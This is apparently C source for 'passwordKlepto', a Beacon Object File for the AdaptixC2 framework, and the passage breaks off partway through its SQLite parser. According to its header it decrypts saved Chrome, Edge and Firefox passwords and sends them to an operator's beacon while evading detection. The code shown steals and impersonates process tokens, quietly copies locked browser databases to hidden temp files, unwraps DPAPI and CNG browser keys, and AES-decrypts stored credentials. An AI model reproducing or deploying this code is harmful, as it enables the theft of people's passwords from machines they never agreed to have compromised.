/*
 * passwordKlepto.c — in-process cleartext browser-password BOF for AdaptixC2.
 *
 * Locates Chrome / Edge / Firefox local password stores, decrypts them to
 * cleartext in-process, and prints `URL | user | password` triples to the
 * beacon. No off-host step, no child process (SIEM-graded OPSEC).
 *
 *   Chromium (Chrome/Edge):
 *     - v10  : Local State "encrypted_key" -> DPAPI CryptUnprotectData -> 32B AES key
 *              -> AES-256-GCM decrypt of Login Data `password_value`.
 *     - v20  : Local State "app_bound_encrypted_key" -> IElevator COM DecryptData
 *              (as the user) OR double-DPAPI (as SYSTEM w/ impersonation) -> inner
 *              key blob -> old: CNG NCryptOpenKey("Google Chrome Chromekey1") unwrap;
 *              new: flag 1/2/3 derivation (decrypt.py constants) -> 32B AES key
 *              -> AES-256-GCM (or ChaCha20-Poly1305 for flag 2) decrypt.
 *              The correct key is auto-selected per password via the GCM tag oracle.
 *   Firefox:
 *     - registry -> Firefox install dir -> LoadLibrary nss3.dll -> NSS_Init(profile)
 *       -> PK11_GetInternalKeySlot + PK11_Authenticate -> PK11SDRDecrypt each
 *       logins.json encryptedUsername/encryptedPassword.
 *
 * MITRE ATT&CK: T1555.003 / T1555.004 (Credentials from Password Stores: Browser).
 *
 * Build: handled by the Creds-BOF suite Makefile -> _bin/passwordKlepto.{x64,x86}.o
 *
 * NOTE: this box has no Windows runtime. Build + symbol-audit only; decryption
 * validated on the lab. On-target-tuning surfaces are marked `TUNE:`.
 */
#include <windows.h>
#include <stdint.h>
#include "../_include/beacon.h"
#include "../_include/bofdefs.h"
#include "passwordKlepto.h"
#include "abe_iface.h"
/* ABE hollow PIC stub (flat .bin -> C byte array), built by the Makefile. */
#ifdef _WIN64
#include "abe_stub_bin.x64.h"
#else
#include "abe_stub_bin.x32.h"
#endif

/* ---- API decls NOT present in ../_include/bofdefs.h ------------------- */
DECLSPEC_IMPORT HRESULT WINAPI SHELL32$SHGetFolderPathA(HWND hwnd, int csidl, HANDLE hToken, DWORD dwFlags, LPSTR pszPath);
WINBASEAPI  BOOL   WINAPI SHLWAPI$PathAppendA(LPSTR pszPath, LPCSTR pszMore);
WINBASEAPI  BOOL   WINAPI KERNEL32$SetDllDirectoryW(LPCWSTR lpPathName);
WINBASEAPI  HMODULE WINAPI KERNEL32$LoadLibraryExW(LPCWSTR lpLibFileName, HANDLE hFile, DWORD dwFlags);
WINBASEAPI  DWORD  WINAPI KERNEL32$GetTempPathA(DWORD nBufferLength, LPSTR lpBuffer);
WINADVAPI   LONG   WINAPI ADVAPI32$RegEnumKeyW(HKEY hKey, DWORD dwIndex, LPWSTR lpName, DWORD cchName);
DECLSPEC_IMPORT SECURITY_STATUS WINAPI NCRYPT$NCryptOpenStorageProvider(NCRYPT_PROV_HANDLE *phProvider, LPCWSTR pszProviderName, DWORD dwFlags);
DECLSPEC_IMPORT SECURITY_STATUS WINAPI NCRYPT$NCryptOpenKey(NCRYPT_PROV_HANDLE hProvider, NCRYPT_KEY_HANDLE *phKey, LPCWSTR pszKeyName, DWORD dwLegacyKeySpec, DWORD dwFlags);
DECLSPEC_IMPORT SECURITY_STATUS WINAPI NCRYPT$NCryptDecrypt(NCRYPT_KEY_HANDLE hKey, PBYTE pbInput, DWORD cbInput, VOID *pPaddingInfo, PBYTE pbOutput, DWORD cbOutput, DWORD *pcbResult, DWORD dwFlags);
DECLSPEC_IMPORT SECURITY_STATUS WINAPI NCRYPT$NCryptFreeObject(NCRYPT_HANDLE hObject);
/* overlapped pipe completion (not in bofdefs.h) — used by the ABE hollow path */
WINBASEAPI BOOL WINAPI KERNEL32$GetOverlappedResult(HANDLE hFile, LPOVERLAPPED lpOverlapped, LPDWORD lpNumberOfBytesTransferred, BOOL bWait);

#define CSIDL_LOCAL_APPDATA 0x001c
#define CSIDL_APPDATA        0x001a
#define MAX_CAND_KEYS 8
/* -scan mode: scan an already-running browser's memory for the v20 app-bound key */
#define SCAN_MAX_REGION   (4*1024*1024)   /* max RW region size we ReadProcessMemory */
#define SCAN_TIMEOUT_MS   30000           /* overall scan cap (ms) — matches lab extractor */
#define V20_BLOB_CAP      4096            /* max v20 password_value blob we capture */

/* forward decl: apply_wal (helpers section) needs be32, defined later in the
 * SQLite reader section. */
static uint32_t be32(const unsigned char *p);

/* ----------------------------------------------------------------------
 *  generic helpers (adapted from cookie-monster, all libc via MSVCRT$)
 * -------------------------------------------------------------------- */

/* read a file into a heap buffer. paths starting with '\' are resolved under
 * %LOCALAPPDATA% (matches cookie-monster convention). */
char *GetFileContent(char *path, DWORD *size) {
    char fullPath[MAX_PATH];
    HANDLE hFile = INVALID_HANDLE_VALUE;
    DWORD dwRead = 0, dwSize = 0;
    char *buffer = NULL;

    if (size) *size = 0;
    if (!path || !size) return NULL;

    if (path[0] == '\\') {
        char appdata[MAX_PATH];
        SHELL32$SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appdata);
        SHLWAPI$PathAppendA(appdata, path);
        MSVCRT$strncpy(fullPath, appdata, MAX_PATH - 1);
        fullPath[MAX_PATH - 1] = 0;
    } else {
        MSVCRT$strncpy(fullPath, path, MAX_PATH - 1);
        fullPath[MAX_PATH - 1] = 0;
    }

    hFile = KERNEL32$CreateFileA(fullPath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return NULL;

    dwSize = KERNEL32$GetFileSize(hFile, NULL);
    if (dwSize == INVALID_FILE_SIZE || dwSize == 0) { KERNEL32$CloseHandle(hFile); return NULL; }
    buffer = (char *)intAlloc(dwSize + 1);
    if (!buffer) { KERNEL32$CloseHandle(hFile); return NULL; }
    KERNEL32$ReadFile(hFile, buffer, dwSize, &dwRead, NULL);
    KERNEL32$CloseHandle(hFile);
    if (dwSize != dwRead) { intFree(buffer); return NULL; }
    buffer[dwSize] = 0;
    *size = dwSize;
    return buffer;
}

/* copy a file (which may be locked by a running browser) to %TEMP% and return
 * its contents. Opening with full share flags lets us read Chrome's Login Data
 * while it runs; reading from a temp copy also avoids WAL inconsistency. */
char *ReadFileViaTemp(const char *srcPath, DWORD *size) {
    char tmpDir[MAX_PATH], tmpPath[MAX_PATH];
    HANDLE hSrc = INVALID_HANDLE_VALUE, hDst = INVALID_HANDLE_VALUE;
    DWORD dwSrc = 0, dwRead = 0, dwWritten = 0;
    char *buf = NULL;
    static DWORD uniq = 0; /* process-lifetime counter for unique temp names */

    if (size) *size = 0;
    if (!srcPath || !size) return NULL;

    hSrc = KERNEL32$CreateFileA(srcPath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hSrc == INVALID_HANDLE_VALUE) return NULL;
    dwSrc = KERNEL32$GetFileSize(hSrc, NULL);
    if (dwSrc == INVALID_FILE_SIZE || dwSrc == 0) { KERNEL32$CloseHandle(hSrc); return NULL; }

    if (!KERNEL32$GetTempPathA(MAX_PATH, tmpDir)) { KERNEL32$CloseHandle(hSrc); return NULL; }
    MSVCRT$_snprintf(tmpPath, MAX_PATH, "%spwk_%lu_%lu.tmp", tmpDir, (unsigned long)KERNEL32$GetTickCount(), (unsigned long)uniq++);

    hDst = KERNEL32$CreateFileA(tmpPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_TEMPORARY | FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hDst == INVALID_HANDLE_VALUE) { KERNEL32$CloseHandle(hSrc); return NULL; }

    buf = (char *)intAlloc(dwSrc);
    if (!buf) { KERNEL32$CloseHandle(hSrc); KERNEL32$CloseHandle(hDst); return NULL; }
    if (!KERNEL32$ReadFile(hSrc, buf, dwSrc, &dwRead, NULL) || dwRead != dwSrc) { intFree(buf); KERNEL32$CloseHandle(hSrc); KERNEL32$CloseHandle(hDst); return NULL; }
    KERNEL32$CloseHandle(hSrc);
    if (!KERNEL32$WriteFile(hDst, buf, dwSrc, &dwWritten, NULL) || dwWritten != dwSrc) { intFree(buf); KERNEL32$CloseHandle(hDst); return NULL; }
    KERNEL32$CloseHandle(hDst);

    *size = dwSrc;
    return buf;
}

/* Apply a SQLite WAL (<dbPath>-wal) on top of the main DB image so we see the
 * live state, not the stale pre-checkpoint main file. Chrome/Edge Login Data
 * runs in WAL mode while the browser is open, so recent rows can live ONLY in
 * the -wal file (the main file's table leaf can be empty -> 0 logins). Returns
 * a heap merged buffer (caller intFree) + *outLen, or NULL to mean "no valid
 * WAL, use main as-is". Skips checksum validation (salt-match + apply in order
 * is enough for a read; last write to each page wins). */
static unsigned char *apply_wal(unsigned char *main, DWORD mainLen, unsigned char *wal, DWORD walLen, DWORD *outLen) {
    uint32_t magic, wpageSize, salt1, salt2;
    DWORD frameSize, off, maxPage = 0, newLen;
    unsigned char *buf = NULL;
    magic = be32(wal);
    if (magic != 0x377f0682 && magic != 0x377f0683) return NULL;   /* not a WAL */
    wpageSize = be32(wal + 8);
    if (wpageSize < 512 || (wpageSize & (wpageSize - 1))) return NULL;
    salt1 = be32(wal + 16);
    salt2 = be32(wal + 20);
    frameSize = 24 + wpageSize;
    off = 32;
    while (off + frameSize <= walLen) {              /* pass 1: max page (size buf) */
        uint32_t pgno = be32(wal + off);
        uint32_t fs1  = be32(wal + off + 8);
        uint32_t fs2  = be32(wal + off + 12);
        if (fs1 != salt1 || fs2 != salt2) break;
        if (pgno > maxPage) maxPage = pgno;
        off += frameSize;
    }
    if (maxPage == 0) return NULL;
    newLen = maxPage * wpageSize;
    if (newLen < mainLen) newLen = mainLen;
    buf = (unsigned char *)intAlloc(newLen);
    if (!buf) return NULL;
    MSVCRT$memcpy(buf, main, mainLen);
    if (newLen > mainLen) MSVCRT$memset(buf + mainLen, 0, newLen - mainLen);
    off = 32;
    while (off + frameSize <= walLen) {              /* pass 2: overlay live pages */
        uint32_t pgno = be32(wal + off);
        uint32_t fs1  = be32(wal + off + 8);
        uint32_t fs2  = be32(wal + off + 12);
        if (fs1 != salt1 || fs2 != salt2) break;
        if (pgno >= 1 && pgno * wpageSize <= newLen)
            MSVCRT$memcpy(buf + (pgno - 1) * wpageSize, wal + off + 24, wpageSize);
        off += frameSize;
    }
    if (outLen) *outLen = newLen;
    return buf;
}

/* read a SQLite DB file AND its -wal (if present), returning the WAL-merged
 * image. Caller intFree. */
static char *ReadDbWithWal(const char *dbPath, DWORD *outLen) {
    char walPath[MAX_PATH];
    char *main = NULL, *wal = NULL, *merged = NULL;
    DWORD mainLen = 0, walLen = 0;
    main = ReadFileViaTemp(dbPath, &mainLen);
    if (!main) { if (outLen) *outLen = 0; return NULL; }
    MSVCRT$_snprintf(walPath, sizeof(walPath), "%s-wal", dbPath);
    wal = ReadFileViaTemp(walPath, &walLen);
    if (wal && walLen >= 32) {
        DWORD mergedLen = 0;
        merged = (char *)apply_wal((unsigned char *)main, mainLen, (unsigned char *)wal, walLen, &mergedLen);
        if (merged) { intFree(main); intFree(wal); if (outLen) *outLen = mergedLen; return merged; }
    }
    if (wal) intFree(wal);
    if (outLen) *outLen = mainLen;
    return main;
}

/* extract the value substring of a JSON `"key":"value"` field. returns pointer
 * into buffer (NOT a copy) and length via *outLen. */
char *ExtractKey(char *buffer, const char *pattern, DWORD *outLen) {
    char *start = MSVCRT$strstr(buffer, pattern);
    char *end;
    if (!start) { if (outLen) *outLen = 0; return NULL; }
    start += MSVCRT$strlen(pattern);
    end = MSVCRT$strchr(start, '"');
    if (!end) { if (outLen) *outLen = 0; return NULL; }
    if (outLen) *outLen = (DWORD)(end - start);
    return start;
}

static const char *B64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static int is_b64(char c) {
    return (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || (c >= '0' && c <= '9') || c == '+' || c == '/';
}

/* base64-decode a NUL-terminated string. caller frees with intFree. */
unsigned char *Base64Decode(const char *enc, size_t *outLen) {
    int inLen, i = 0, j = 0, in_ = 0;
    unsigned char ca4[4], ca3[3];
    size_t dec;
    unsigned char *out;
    if (!enc || !outLen) { if (outLen) *outLen = 0; return NULL; }
    inLen = (int)MSVCRT$strlen(enc);
    dec = ((inLen + 3) / 4) * 3;
    out = (unsigned char *)intAlloc(dec + 1);
    if (!out) { *outLen = 0; return NULL; }
    *outLen = 0;
    while (inLen-- && enc[in_] != '=' && is_b64(enc[in_])) {
        ca4[i++] = enc[in_++];
        if (i == 4) {
            for (i = 0; i < 4; i++) {
                char *p = MSVCRT$strchr(B64, ca4[i]);
                if (!p) { *outLen = 0; intFree(out); return NULL; }
                ca4[i] = (unsigned char)(p - B64);
            }
            ca3[0] = (unsigned char)((ca4[0] << 2) | ((ca4[1] & 0x30) >> 4));
            ca3[1] = (unsigned char)(((ca4[1] & 0xf) << 4) | ((ca4[2] & 0x3c) >> 2));
            ca3[2] = (unsigned char)(((ca4[2] & 0x3) << 6) | ca4[3]);
            for (i = 0; i < 3; i++) out[(*outLen)++] = ca3[i];
            i = 0;
        }
    }
    if (i) {
        for (j = i; j < 4; j++) ca4[j] = 0;
        for (j = 0; j < 4; j++) ca4[j] = (unsigned char)(MSVCRT$strchr(B64, ca4[j]) - B64);
        ca3[0] = (unsigned char)((ca4[0] << 2) | ((ca4[1] & 0x30) >> 4));
        ca3[1] = (unsigned char)(((ca4[1] & 0xf) << 4) | ((ca4[2] & 0x3c) >> 2));
        ca3[2] = (unsigned char)(((ca4[2] & 0x3) << 6) | ca4[3]);
        for (j = 0; j < i - 1; j++) out[(*outLen)++] = ca3[j];
    }
    return out;
}

/* NUL-terminate up to `cap` bytes into dst (always NUL-terminated). For safe
 * BeaconPrintf with plain %s (LESSONS U4: no precision). */
static void cstrncpy(char *dst, const char *src, int n, int cap) {
    int i, m = (n < cap - 1) ? n : cap - 1;
    for (i = 0; i < m; i++) dst[i] = src[i];
    dst[m] = 0;
}

void HexPrint(const char *label, const unsigned char *b, DWORD n) {
    char *hex = (char *)intAlloc(n * 3 + 1);
    DWORD i; int off = 0;
    if (!hex) return;
    for (i = 0; i < n; i++) { int w = MSVCRT$_snprintf(hex + off, n * 3 + 1 - off, "%02x", b[i]); if (w < 0) break; off += w; }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] %s (%lu bytes): %s", label, n, hex);
    intFree(hex);
}

/* ----------------------------------------------------------------------
 *  impersonation (reuse cookie-monster StealAndImpersonate) — needed so a
 *  SYSTEM beacon can run user-context DPAPI on the v10/v20 keys.
 * -------------------------------------------------------------------- */
BOOL StealAndImpersonate(DWORD pid) {
    HANDLE hProcess = NULL, hToken = NULL, hUser = NULL;
    hProcess = KERNEL32$OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProcess) return FALSE;
    if (!ADVAPI32$OpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_DUPLICATE, &hToken)) { KERNEL32$CloseHandle(hProcess); return FALSE; }
    if (!ADVAPI32$DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hUser)) { KERNEL32$CloseHandle(hToken); KERNEL32$CloseHandle(hProcess); return FALSE; }
    if (!ADVAPI32$ImpersonateLoggedOnUser(hUser)) { KERNEL32$CloseHandle(hToken); KERNEL32$CloseHandle(hProcess); KERNEL32$CloseHandle(hUser); return FALSE; }
    /* token handles stay open until RevertToSelf + close in caller */
    return TRUE;
}

/* ----------------------------------------------------------------------
 *  BCrypt AES-256-GCM / ChaCha20-Poly1305 decrypt
 * -------------------------------------------------------------------- */
/* Returns heap plaintext (caller intFree) and *outLen, or NULL.
 * status_ok set TRUE iff GCM tag verified (used as key-validity oracle).
 * TUNE: BCrypt GCM writes plaintext to pbOutput even on STATUS_AUTH_TAG_MISMATCH;
 *       we use the buffer regardless and set outLen=ctLen. */
unsigned char *AesGcmDecrypt(const unsigned char *key32, const unsigned char *nonce12,
                            const unsigned char *ct, DWORD ctLen,
                            const unsigned char *tag16,
                            DWORD *outLen, BOOL *statusOk, int useChaCha) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO *ai = NULL;
    unsigned char *out = NULL;
    DWORD res = 0;
    NTSTATUS st;
    LPCWSTR alg = useChaCha ? L"CHACHA20_POLY1305" : BCRYPT_AES_ALGORITHM;

    if (statusOk) *statusOk = FALSE;
    if (outLen) *outLen = 0;
    if (ctLen == 0) return NULL;

    if (BCRYPT$BCryptOpenAlgorithmProvider(&hAlg, alg, NULL, 0)) return NULL;
    if (BCRYPT$BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0)) goto done;
    if (BCRYPT$BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PUCHAR)key32, 32, 0)) goto done;

    ai = (BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO *)intAlloc(sizeof(*ai));
    if (!ai) goto done;
    MSVCRT$memset(ai, 0, sizeof(*ai));           /* never ={0} aggregate init (LESSONS U2) */
    ai->cbSize = sizeof(*ai);
    ai->dwInfoVersion = 1;                        /* BCRYPT_INIT_AUTH_MODE_INFO_VERSION */
    ai->pbNonce = (PUCHAR)nonce12; ai->cbNonce = 12;
    ai->pbTag = (PUCHAR)tag16;    ai->cbTag = 16;

    out = (unsigned char *)intAlloc(ctLen + 16);
    if (!out) goto done;
    st = BCRYPT$BCryptDecrypt(hKey, (PUCHAR)ct, ctLen, ai, NULL, 0, out, ctLen + 16, &res, 0);
    if (statusOk) *statusOk = (st == 0);          /* STATUS_SUCCESS == tag valid */
    if (outLen) *outLen = ctLen;                  /* GCM plaintext len == ciphertext len */
    BCRYPT$BCryptDestroyKey(hKey);
    BCRYPT$BCryptCloseAlgorithmProvider(hAlg, 0);
    intFree(ai);
    return out;
done:
    if (hKey) BCRYPT$BCryptDestroyKey(hKey);
    BCRYPT$BCryptCloseAlgorithmProvider(hAlg, 0);
    if (ai) intFree(ai);
    return NULL;
}

/* CNG unwrap of the old-format app-bound key_blob (0x03 || 32B CNG-encrypted),
 * using the "Google Chrome Chromekey1" NCRYPT key. Returns 32B key (heap) or NULL. */
unsigned char *CngUnwrapChromeKey(const unsigned char *enc32) {
    NCRYPT_PROV_HANDLE hProv = 0;
    NCRYPT_KEY_HANDLE hKey = 0;
    DWORD outLen = 0;
    unsigned char *out = NULL;
    SECURITY_STATUS st;

    st = NCRYPT$NCryptOpenStorageProvider(&hProv, L"Microsoft Software Key Storage Provider", 0);
    if (st) { BeaconPrintf(CALLBACK_ERROR, "[!] NCryptOpenStorageProvider: 0x%08X", st); return NULL; }
    st = NCRYPT$NCryptOpenKey(hProv, &hKey, L"Google Chrome Chromekey1", 0, 0);
    if (st) { BeaconPrintf(CALLBACK_ERROR, "[!] NCryptOpenKey(Chrome Chromekey1): 0x%08X", st); NCRYPT$NCryptFreeObject(hProv); return NULL; }
    st = NCRYPT$NCryptDecrypt(hKey, (PBYTE)enc32, 32, NULL, NULL, 0, &outLen, NCRYPT_SILENT_FLAG);
    if (st) { BeaconPrintf(CALLBACK_ERROR, "[!] NCryptDecrypt size: 0x%08X", st); NCRYPT$NCryptFreeObject(hKey); NCRYPT$NCryptFreeObject(hProv); return NULL; }
    out = (unsigned char *)intAlloc(outLen);
    if (!out) { NCRYPT$NCryptFreeObject(hKey); NCRYPT$NCryptFreeObject(hProv); return NULL; }
    st = NCRYPT$NCryptDecrypt(hKey, (PBYTE)enc32, 32, NULL, out, outLen, &outLen, NCRYPT_SILENT_FLAG);
    NCRYPT$NCryptFreeObject(hKey);
    NCRYPT$NCryptFreeObject(hProv);
    if (st) { BeaconPrintf(CALLBACK_ERROR, "[!] NCryptDecrypt: 0x%08X", st); intFree(out); return NULL; }
    return out;
}

/* ----------------------------------------------------------------------
 *  Minimal SQLite3 file-format reader (no sqlite3 link)
 *  Walks a table b-tree and decodes leaf-cell records. Only needs the `logins`
 *  table, but the walker is generic.
 * -------------------------------------------------------------------- */
static uint16_t be16(const unsigned char *p) { return (uint16_t)((p[0] << 8) | p[1]); }
static uint32_t be32(const unsigned char *p) { return ((uint32_t)p[0] << 24) | ((uint32_t)p[1] << 16) | ((uint32_t)p[2] << 8) | p[3]; }

/* varint: 1-9 bytes. returns bytes consumed (0 on error), value in *val */
static int read_varint(const unsigned char *p, int rem, uint64_t *val) {
    uint64_t v = 0; int i;
    if (rem <= 0) return 0;
    for (i = 0; i < 9 && i < rem; i++) {
        unsigned char b = p[i];
        if (i < 8) { v = (v << 7) | (b & 0x7f); if (!(b & 0x80)) { *val = v; return i + 1; } }
        else { v = (v << 8) | b; *val = v; return 9; }
    }
    return 0;
}

/* decoded column */
typedef struct {
    int isText, isBlob, isInt, isNull;
    const unsigned char *ptr;
    DWORD len;
    uint64_t ival;
} Col;

typedef void (*RecCb)(Col *cols, int ncol, void *ctx);

typedef struct {
    const char *name;
    DWORD root;
    int done;
    char *sqlOut;     /* optional: copy the matched table's CREATE TABLE sql here */
    int   sqlCap;
} SchemaCtx;

/* forward decl: schema_cb captures a table's rootpage (+ CREATE sql) in
 * sqlite_find_table. Non-static: called via walk_table's RecCb indirection. */
void schema_cb(Col *cols, int ncol, void *ctx);

typedef struct {
    unsigned char *db;
    DWORD dbLen;
    DWORD pageSize;
    DWORD reserved;
    DWORD usable;
} SQLiteDB;

/* read a leaf-cell record; if it overflows the page, follow the overflow chain
 * and assemble the full payload into a heap buffer. */
static void decode_leaf_cell(SQLiteDB *s, const unsigned char *cell, DWORD cellRem, RecCb cb, void *ctx) {
    uint64_t payloadLen64, rowid;
    DWORD payloadLen, hdrBase, bodyBase, i;
    int c, cn;
    unsigned char *rec = NULL;
    DWORD recLen = 0, have = 0, localBytes = 0;
    const unsigned char *p;
    Col cols[16];
    uint64_t headerLen;
    DWORD hp, bp, hdrConsumed;

    c = read_varint(cell, (int)cellRem, &payloadLen64); if (!c) return;
    cell += c; cellRem -= c;
    c = read_varint(cell, (int)cellRem, &rowid); if (!c) return;
    cell += c; cellRem -= c;
    if (payloadLen64 > 0x1000000) return;          /* sanity cap 16MB */
    payloadLen = (DWORD)payloadLen64;

    /* compute local payload length + overflow */
    {
        DWORD U = s->usable;
        DWORD X = U - 35;
        if (payloadLen <= X) localBytes = payloadLen;
        else {
            DWORD M = ((U - 12) * 32 / 255) - 23;
            DWORD K = M + ((payloadLen - M) % (U - 4));
            localBytes = (K <= X) ? K : M;
        }
    }
    if (localBytes > cellRem) return;

    rec = (unsigned char *)intAlloc(payloadLen + 1);
    if (!rec) return;
    MSVCRT$memcpy(rec, cell, localBytes);
    have = localBytes;

    /* overflow chain */
    if (localBytes < payloadLen) {
        DWORD next = be32(cell + localBytes);
        while (next && have < payloadLen) {
            DWORD off = (next - 1) * s->pageSize;
            DWORD chunk;
            if (off + s->pageSize > s->dbLen) break;
            p = s->db + off;
            next = be32(p);
            chunk = s->usable - 4;                 /* data per overflow page */
            if (chunk > payloadLen - have) chunk = payloadLen - have;
            MSVCRT$memcpy(rec + have, p + 4, chunk);
            have += chunk;
        }
    }
    if (have < payloadLen) { intFree(rec); return; }
    recLen = payloadLen;
    rec[recLen] = 0;

    /* decode record: header length varint, serial types, body */
    cn = read_varint(rec, (int)recLen, &headerLen);
    if (!cn || headerLen > recLen) { intFree(rec); return; }
    hdrConsumed = cn;          /* bytes consumed by the header-length varint */
    hp = hdrConsumed;
    bp = (DWORD)headerLen;     /* body starts after the full header */
    for (i = 0; i < 16; i++) { cols[i].isText = cols[i].isBlob = cols[i].isInt = cols[i].isNull = 0; cols[i].ptr = NULL; cols[i].len = 0; cols[i].ival = 0; }
    c = 0;
    while (hp < (DWORD)headerLen && bp <= recLen && c < 16) {
        uint64_t st;
        DWORD clen = 0;
        int cn2 = read_varint(rec + hp, (int)((DWORD)headerLen - hp), &st);
        if (!cn2) break;
        hp += cn2;
        if (st == 0) { cols[c].isNull = 1; clen = 0; }
        else if (st <= 4) { cols[c].isInt = 1; clen = (DWORD)st; }
        else if (st == 5) { cols[c].isInt = 1; clen = 6; }
        else if (st == 6 || st == 7) { cols[c].isInt = (st == 6); clen = 8; }
        else if (st == 8 || st == 9) { cols[c].isInt = 1; cols[c].ival = (st == 9); clen = 0; }
        else if (st >= 12 && (st & 1) == 0) { cols[c].isBlob = 1; clen = (DWORD)((st - 12) / 2); }
        else if (st >= 13 && (st & 1))      { cols[c].isText = 1; clen = (DWORD)((st - 13) / 2); }
        else { break; }
        if (bp + clen > recLen) break;
        cols[c].ptr = rec + bp;
        cols[c].len = clen;
        if (cols[c].isInt && clen && clen <= 8) {
            uint64_t iv = 0; DWORD k;
            for (k = 0; k < clen; k++) iv = (iv << 8) | cols[c].ptr[k];
            cols[c].ival = iv;
        }
        bp += clen;
        c++;
    }

    cb(cols, c, ctx);
    intFree(rec);
}

/* recursive table b-tree walker */
static void walk_table(SQLiteDB *s, DWORD pageNo, int depth, RecCb cb, void *ctx) {
    DWORD pageOff, hdrOff, cellPtrOff, ncells, i;
    unsigned char type;
    if (depth > 8 || pageNo == 0) return;
    pageOff = (pageNo - 1) * s->pageSize;
    if (pageOff + s->pageSize > s->dbLen) return;
    hdrOff = pageOff + (pageNo == 1 ? 100 : 0);
    if (hdrOff + 12 > s->dbLen) return;
    type = s->db[hdrOff];
    ncells = be16(s->db + hdrOff + 3);

    if (type == 0x05) {              /* interior table */
        DWORD rightMost;
        cellPtrOff = hdrOff + 12;
        for (i = 0; i < ncells; i++) {
            DWORD cp, child;
            if (cellPtrOff + 2 * (i + 1) > s->dbLen) break;
            cp = be16(s->db + cellPtrOff + 2 * i);
            if (pageOff + cp + 4 > s->dbLen) continue;
            child = be32(s->db + pageOff + cp);
            walk_table(s, child, depth + 1, cb, ctx);
        }
        rightMost = be32(s->db + hdrOff + 8);
        walk_table(s, rightMost, depth + 1, cb, ctx);
    } else if (type == 0x0d) {       /* leaf table */
        cellPtrOff = hdrOff + 8;
        for (i = 0; i < ncells && i < 5000; i++) {
            DWORD cp;
            if (cellPtrOff + 2 * (i + 1) > s->dbLen) break;
            cp = be16(s->db + cellPtrOff + 2 * i);
            if (cp == 0 || pageOff + cp >= s->dbLen) continue;
            decode_leaf_cell(s, s->db + pageOff + cp, s->pageSize - cp, cb, ctx);
        }
    }
}

/* open a SQLite DB blob, find tableName's rootpage (and optionally copy its
 * CREATE TABLE sql into sqlOut). Returns the rootpage (0 if not found). */
static DWORD sqlite_find_table(unsigned char *db, DWORD dbLen, const char *tableName,
                               char *sqlOut, int sqlCap) {
    SQLiteDB s;
    DWORD pageSize;
    SchemaCtx fc;
    if (!db || dbLen < 100 || MSVCRT$memcmp(db, "SQLite format 3", 15) != 0) return 0;
    pageSize = be16(db + 16);
    if (pageSize == 1) pageSize = 65536;
    if (pageSize < 512 || (pageSize & (pageSize - 1))) return 0;
    s.db = db; s.dbLen = dbLen; s.pageSize = pageSize; s.reserved = db[20]; s.usable = pageSize - db[20];
    if (sqlOut && sqlCap > 0) sqlOut[0] = 0;
    fc.name = tableName; fc.root = 0; fc.done = 0; fc.sqlOut = sqlOut; fc.sqlCap = sqlCap;
    walk_table(&s, 1, 0, schema_cb, &fc);
    return fc.root;
}

/* walk a table given its rootpage; cb receives each row's cols. */
static void sqlite_walk_root(unsigned char *db, DWORD dbLen, DWORD root, RecCb cb, void *ctx) {
    SQLiteDB s;
    DWORD pageSize;
    if (!db || dbLen < 100 || !root) return;
    pageSize = be16(db + 16);
    if (pageSize == 1) pageSize = 65536;
    if (pageSize < 512 || (pageSize & (pageSize - 1))) return;
    s.db = db; s.dbLen = dbLen; s.pageSize = pageSize; s.reserved = db[20]; s.usable = pageSize - db[20];
    walk_table(&s, root, 0, cb, ctx);
}

/* Parse a CREATE TABLE statement's column list into names[] (in physical order).
 * We do NOT execute SQL — the b-tree walker reads columns by position, so we
 * must know which physical index each named column occupies. Table constraints
 * (PRIMARY/UNIQUE/CHECK/FOREIGN/CONSTRAINT) are skipped: they are not columns
 * and do not occupy a record position. Returns the number of real columns. */
static int kw_ieq(const char *t, int tl, const char *kw) {
    int i;
    for (i = 0; i < tl; i++) {
        char c = t[i], k = kw[i];
        if (k == 0) return 0;            /* token longer than keyword */
        if (c >= 'A' && c <= 'Z') c = (char)(c + 32);
        if (k >= 'A' && k <= 'Z') k = (char)(k + 32);
        if (c != k) return 0;
    }
    return kw[tl] == 0 ? 1 : 0;
}
static int parse_create_cols(const char *sql, int sqlLen, char names[][40], int maxCols) {
    int n = 0, depth = 0;
    const char *p = sql, *end = sql + sqlLen;
    const char *seg;                     /* start of current top-level segment */
    /* find the opening paren of the column list */
    while (p < end && *p != '(') p++;
    if (p >= end) return 0;
    p++; depth = 1; seg = p;             /* first segment begins right after '(' */
    for (; p < end; p++) {
        char c = *p;
        if (c == '(') { depth++; continue; }
        if (c == ')') { depth--; if (depth == 0) break; continue; }   /* final segment */
        if (c == ',' && depth == 1) {
            const char *q = seg;
            char tok[40]; int tl = 0;
            while (q < p && (*q == ' ' || *q == '\t' || *q == '\n' || *q == '\r')) q++;
            while (q < p && *q != ' ' && *q != '\t' && *q != '\n' && *q != '\r' && *q != '(' && tl < 39)
                tok[tl++] = *q++;
            tok[tl] = 0;
            if (tl > 0 && n < maxCols) {
                /* skip table-constraint keywords; accept identifier-like names */
                if (!kw_ieq(tok, tl, "primary") && !kw_ieq(tok, tl, "unique") &&
                    !kw_ieq(tok, tl, "check")   && !kw_ieq(tok, tl, "foreign") &&
